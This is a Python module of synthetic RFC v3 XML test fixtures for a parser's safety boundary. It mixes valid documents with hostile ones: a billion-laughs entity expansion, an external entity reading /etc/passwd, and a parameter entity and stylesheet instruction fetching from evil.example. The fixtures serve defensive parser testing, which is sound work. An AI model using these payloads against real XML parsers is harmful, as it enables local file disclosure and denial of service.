"""Synthetic RFC v3 XML fixtures: one safe baseline and one per hostile shape.

No fixture here contains real RFC text. The safe baseline is deliberately
minimal — just enough structure for the boundary and the structure extractor to
have something valid to accept.
"""

from __future__ import annotations

from pathlib import Path

SAFE_RFC_XML = """<?xml version='1.0' encoding='utf-8'?>
<rfc xmlns:xi="http://www.w3.org/2001/XInclude" number="9999" version="3">
  <front>
    <title abbrev="Synthetic">A Synthetic Specification</title>
    <date month="08" year="2026"/>
  </front>
  <middle>
    <section anchor="intro" numbered="true">
      <name>Introduction</name>
      <t>This paragraph exists so the tree has content.</t>
      <section anchor="scope" numbered="true">
        <name>Scope</name>
        <t>See <xref target="intro"/> and <xref target="RFC9110"/>.</t>
      </section>
    </section>
  </middle>
  <back>
    <references>
      <name>Normative References</name>
      <reference anchor="RFC9110"><front><title>Placeholder</title></front></reference>
    </references>
  </back>
</rfc>
"""

# synthetic-spec-text: a fabricated RFC 9999, not a quotation.
NORMATIVE_RFC_XML = """<?xml version='1.0' encoding='utf-8'?>
<rfc number="9999" version="3">
  <front><title>Normative</title><date month="08" year="2026"/></front>
  <middle>
    <section anchor="one" numbered="true">
      <name>One</name>
      <t>A sender <bcp14>MUST</bcp14> do this and <bcp14>SHOULD NOT</bcp14> do that.</t>
      <t>The word MUST here is prose, not a marked keyword.</t>
      <section anchor="one-one" numbered="true">
        <name>One One</name>
        <t>A recipient <bcp14>MAY</bcp14> ignore it.</t>
      </section>
    </section>
    <section anchor="two" numbered="true">
      <name>Two</name>
      <t>Nothing normative lives here.</t>
    </section>
  </middle>
</rfc>
"""

# synthetic-spec-text: a fabricated RFC 9999, not a quotation.
UNWRAPPED_PROSE_XML = """<?xml version='1.0' encoding='utf-8'?>
<rfc number="9999" version="3">
  <front><title>Unwrapped</title><date month="08" year="2026"/></front>
  <middle>
    <section anchor="one" numbered="true">
      <name>One</name>
      <t>A wrapped paragraph.</t>
      <ul>
        <li>An item the source did not wrap, stating <bcp14>MUST</bcp14>.</li>
        <li><t>An item the source did wrap.</t></li>
      </ul>
      <dl>
        <dt>term</dt>
        <dd>A definition body the source did not wrap.</dd>
      </dl>
      <table><tbody><tr><td>cell</td><td>other</td></tr></tbody></table>
    </section>
  </middle>
</rfc>
"""

# synthetic-spec-text: a fabricated RFC 9999, not a quotation.
QA_RFC_XML = """<?xml version='1.0' encoding='utf-8'?>
<rfc number="9999" version="3">
  <front><title>Quality</title><date month="08" year="2026"/></front>
  <middle>
    <section anchor="one" numbered="true">
      <name>One</name>
      <t pn="section-1-1">Prose that <bcp14>MUST</bcp14> cite
        <xref target="two" derivedContent="Section 2"/>.</t>
      <sourcecode pn="section-1-2">token = 1*tchar</sourcecode>
      <dl><dt>term</dt><dd pn="section-1-3">A definition body.</dd></dl>
      <table pn="table-1">
        <thead><tr><th>Code</th></tr></thead>
        <tbody><tr><td>200</td></tr></tbody>
      </table>
    </section>
    <section anchor="two" numbered="true">
      <name>Two</name>
      <t pn="section-2-1">More prose here.</t>
    </section>
  </middle>
</rfc>
"""

CODE_BLOCK_XML = """<?xml version='1.0' encoding='utf-8'?>
<rfc number="9999" version="3">
  <front><title>Grammar</title><date month="08" year="2026"/></front>
  <middle>
    <section anchor="one" numbered="true">
      <name>One</name>
      <t pn="section-1-1">Prose before the grammar.</t>
      <sourcecode pn="section-1-2" type="abnf">token = 1*tchar</sourcecode>
      <t pn="section-1-3">Prose after the grammar.</t>
      <figure><artwork pn="section-1-4">a diagram</artwork></figure>
    </section>
    <section anchor="collected.abnf" numbered="true">
      <name>Collected ABNF</name>
      <sourcecode pn="section-appendix.a-1">token = 1*tchar</sourcecode>
    </section>
  </middle>
</rfc>
"""

DERIVED_XREF_XML = """<?xml version='1.0' encoding='utf-8'?>
<rfc number="9999" version="3">
  <front><title>References</title><date month="08" year="2026"/></front>
  <middle>
    <section anchor="one" numbered="true">
      <name>One</name>
      <t>Semantics are defined in <xref target="two" derivedContent="Section 2"/>
        and syntax in <xref target="three" derivedContent="Section 3"/>.</t>
      <t>An inline reference reads <xref target="two">the second section</xref>.</t>
    </section>
    <section anchor="two" numbered="true"><name>Two</name></section>
    <section anchor="three" numbered="true"><name>Three</name></section>
  </middle>
</rfc>
"""

TABLE_RFC_XML = """<?xml version='1.0' encoding='utf-8'?>
<rfc number="9999" version="3">
  <front><title>Tables</title><date month="08" year="2026"/></front>
  <middle>
    <section anchor="one" numbered="true">
      <name>One</name>
      <t>A paragraph before the tables.</t>
      <table pn="table-1">
        <thead><tr><th>Code</th><th>Meaning</th></tr></thead>
        <tbody>
          <tr><td>200</td><td>OK</td></tr>
          <tr><td>404</td><td>Not Found</td></tr>
        </tbody>
      </table>
      <table pn="table-2">
        <tbody>
          <tr><td>alpha</td><td>beta</td><td>gamma</td></tr>
        </tbody>
      </table>
    </section>
    <section anchor="two" numbered="true">
      <name>Two</name>
      <table pn="table-3">
        <tbody><tr><td>solo</td></tr></tbody>
      </table>
    </section>
  </middle>
</rfc>
"""

DANGLING_XREF_XML = """<?xml version='1.0' encoding='utf-8'?>
<rfc number="9999" version="3">
  <front><title>Dangling</title></front>
  <middle>
    <section anchor="alpha" numbered="true">
      <name>Alpha</name>
      <t>Points at <xref target="nowhere"/>, which nothing defines.</t>
    </section>
  </middle>
</rfc>
"""

DUPLICATE_ANCHOR_XML = """<?xml version='1.0' encoding='utf-8'?>
<rfc number="9999" version="3">
  <front><title>Duplicate</title></front>
  <middle>
    <section anchor="same" numbered="true"><name>First</name></section>
    <section anchor="same" numbered="true"><name>Second</name></section>
  </middle>
</rfc>
"""

UNNUMBERED_SECTION_XML = """<?xml version='1.0' encoding='utf-8'?>
<rfc number="9999" version="3">
  <front><title>Mixed</title></front>
  <middle>
    <section anchor="counted" numbered="true"><name>Counted</name></section>
    <section anchor="uncounted" numbered="false"><name>Uncounted</name></section>
    <section anchor="counted-again" numbered="true"><name>Counted Again</name></section>
  </middle>
</rfc>
"""

DOCTYPE_XML = """<?xml version='1.0' encoding='utf-8'?>
<!DOCTYPE rfc>
<rfc number="9999" version="3"><front><title>T</title></front></rfc>
"""

INTERNAL_ENTITY_XML = """<?xml version='1.0' encoding='utf-8'?>
<!DOCTYPE rfc [ <!ENTITY greeting "hello"> ]>
<rfc number="9999" version="3"><front><title>&greeting;</title></front></rfc>
"""

BILLION_LAUGHS_XML = """<?xml version='1.0' encoding='utf-8'?>
<!DOCTYPE rfc [
  <!ENTITY a "aaaaaaaaaa">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
]>
<rfc number="9999" version="3"><front><title>&d;</title></front></rfc>
"""

EXTERNAL_ENTITY_XML = """<?xml version='1.0' encoding='utf-8'?>
<!DOCTYPE rfc [ <!ENTITY leak SYSTEM "file:///etc/passwd"> ]>
<rfc number="9999" version="3"><front><title>&leak;</title></front></rfc>
"""

EXTERNAL_PARAMETER_ENTITY_XML = """<?xml version='1.0' encoding='utf-8'?>
<!DOCTYPE rfc [ <!ENTITY % remote SYSTEM "https://evil.example/e.dtd"> %remote; ]>
<rfc number="9999" version="3"><front><title>T</title></front></rfc>
"""

STYLESHEET_PI_XML = """<?xml version='1.0' encoding='utf-8'?>
<?xml-stylesheet type="text/xsl" href="https://evil.example/x.xsl"?>
<rfc number="9999" version="3"><front><title>T</title></front></rfc>
"""

WRONG_ROOT_XML = """<?xml version='1.0' encoding='utf-8'?>
<html><body><p>Not an RFC.</p></body></html>
"""

MALFORMED_XML = """<?xml version='1.0' encoding='utf-8'?>
<rfc number="9999" version="3"><front><title>Unclosed</front></rfc>
"""


def write(directory: Path, name: str, content: str | bytes) -> Path:
    """Write one fixture as a private regular file and return its path."""
    path = directory / name
    if isinstance(content, str):
        path.write_text(content, encoding="utf-8")
    else:
        path.write_bytes(content)
    path.chmod(0o600)
    return path


def write_safe(directory: Path, name: str = "rfc9999.xml") -> Path:
    return write(directory, name, SAFE_RFC_XML)


def write_invalid_utf8(directory: Path, name: str = "bad.xml") -> Path:
    prologue = b"<?xml version='1.0' encoding='utf-8'?>\n<rfc><front><title>"
    return write(directory, name, prologue + b"\xff\xfe" + b"</title></front></rfc>")


def write_oversized(directory: Path, limit: int, name: str = "big.xml") -> Path:
    filler = "x" * (limit + 1)
    return write(directory, name, f"<?xml version='1.0'?>\n<rfc>{filler}</rfc>")
